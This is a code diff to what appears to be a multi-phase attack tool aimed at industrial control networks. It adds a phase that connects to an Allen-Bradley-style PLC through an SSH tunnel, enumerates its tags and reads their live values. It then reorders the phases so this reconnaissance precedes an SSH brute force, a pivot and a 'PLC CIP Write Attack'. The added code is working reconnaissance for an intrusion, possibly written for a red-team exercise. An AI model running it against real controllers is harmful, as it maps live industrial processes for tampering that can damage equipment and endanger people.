@@ -1661,6 +1661,133 @@ def phase6_defense_check() -> PhaseResult:
     return r
 
 
+# ── Phase 5: CIP Enumerator ───────────────────────────────────────────────────
+
+def phase5_cip_enum() -> PhaseResult:
+    phase_header(5, "CIP Recon — PLC Memory Map")
+    r = PhaseResult("CIP Enumerator")
+
+    from pycomm3 import LogixDriver
+
+    CIP_SLOTS     = ["", "/0", "/1", "/2", "/3"]
+    NUMERIC_TYPES = {"REAL", "DINT", "INT", "LINT", "SINT", "UDINT", "UINT"}
+
+    def _tname(t) -> str:
+        return t.get("tag_name", "") if isinstance(t, dict) else str(getattr(t, "tag_name", ""))
+    def _ttype(t) -> str:
+        return t.get("data_type", "") if isinstance(t, dict) else str(getattr(t, "data_type", ""))
+    def _is_noise(name: str) -> bool:
+        return (
+            name.startswith("__")
+            or "Program:" in name
+            or "Routine:" in name
+            or "Task:"    in name
+            or "Trend:"   in name
+        )
+
+    warn("Assumes ssh -L 44818:<PLC_IP>:44818 tunnel is already live on port 44818")
+
+    plc_conn = None
+    working_path = None
+    for slot in CIP_SLOTS:
+        path = f"127.0.0.1{slot}"
+        info(f"Trying CIP path: {path!r}")
+        drv = LogixDriver(path, init_info=False)
+        try:
+            drv.open()
+            plc_conn     = drv
+            working_path = path
+            ok(f"PLC connected at {path!r}")
+            break
+        except Exception as slot_err:
+            warn(f"  {path!r} → {slot_err}")
+            try: drv.close()
+            except Exception: pass
+
+    if plc_conn is None:
+        r.status  = "failed"
+        r.finding = "All CIP slot paths failed — verify tunnel is live on port 44818"
+        err(r.finding)
+        return r
+
+    try:
+        info("Pulling full tag list from PLC data table...")
+        all_tags  = plc_conn.get_tag_list()
+        user_tags = [t for t in all_tags if not _is_noise(_tname(t))]
+
+        ok(
+            f"{len(all_tags)} tags retrieved — "
+            f"{len(all_tags) - len(user_tags)} system tags suppressed — "
+            f"[bold]{len(user_tags)} user-defined tags remain[/bold]"
+        )
+
+        if not user_tags:
+            r.status  = "failed"
+            r.finding = "No user-defined tags found"
+            err(r.finding)
+            return r
+
+        info("Reading live values from PLC...")
+        tbl = Table(
+            title="[bold magenta]Target Environment: PLC Memory Map[/bold magenta]",
+            show_header=True, header_style="bold cyan",
+            border_style="dim", show_lines=False, padding=(0, 1),
+        )
+        tbl.add_column("#",          style="dim",    width=5,  justify="right")
+        tbl.add_column("Tag Name",   style="green",  width=42)
+        tbl.add_column("Data Type",  style="yellow", width=14)
+        tbl.add_column("Live Value", style="white",  width=22)
+
+        reads_ok     = 0
+        reads_denied = 0
+        findings_log = []
+
+        for i, tag in enumerate(user_tags, 1):
+            name  = _tname(tag)
+            dtype = _ttype(tag)
+            try:
+                result = plc_conn.read(name)
+                if result is None or result.value is None:
+                    value_str = "[dim]None[/dim]"
+                else:
+                    value_str = escape(str(result.value))
+                    findings_log.append(f"{name} ({dtype}) = {result.value}")
+                reads_ok += 1
+            except Exception:
+                value_str    = "[bold red]ACCESS DENIED[/bold red]"
+                reads_denied += 1
+
+            tbl.add_row(str(i), escape(name), escape(dtype), value_str)
+
+        console.print(tbl)
+        console.print()
+        console.print(Panel(
+            f"[bold white]Tags read successfully :[/bold white] [green]{reads_ok}[/green]\n"
+            f"[bold white]Access denied          :[/bold white] "
+            + (f"[red]{reads_denied}[/red]" if reads_denied else "[dim]0[/dim]") +
+            f"\n[bold white]Total user tags        :[/bold white] {len(user_tags)}",
+            title="[bold cyan] Enumeration Summary [/bold cyan]",
+            border_style="cyan", expand=False,
+        ))
+
+        r.status  = "success"
+        r.finding = (
+            f"{len(user_tags)} user tags enumerated — "
+            f"{reads_ok} readable, {reads_denied} denied"
+        )
+        r.output  = "\n".join(findings_log)
+
+    except Exception as e:
+        r.status  = "failed"
+        r.finding = str(e)
+        err(str(e))
+    finally:
+        try: plc_conn.close()
+        except Exception: pass
+
+    return r
+
+
 # ── Final report ──────────────────────────────────────────────────────────────
 
 def print_report():
@@ -1710,8 +1837,9 @@ PHASES = [
     (2, "IDMZ Recon",            phase2_idmz_recon),
     (3, "SSH Brute Force",       phase3_ssh_bruteforce),
     (4, "SSH Pivot / OT Recon",  phase4_ssh_pivot),
-    (5, "PLC CIP Write Attack",  phase5_plc_attack),
-    (6, "Defense Validation",    phase6_defense_check),
+    (5, "CIP Recon — PLC Map",   phase5_cip_enum),
+    (6, "PLC CIP Write Attack",  phase5_plc_attack),
+    (7, "Defense Validation",    phase6_defense_check),
 ]
 
 
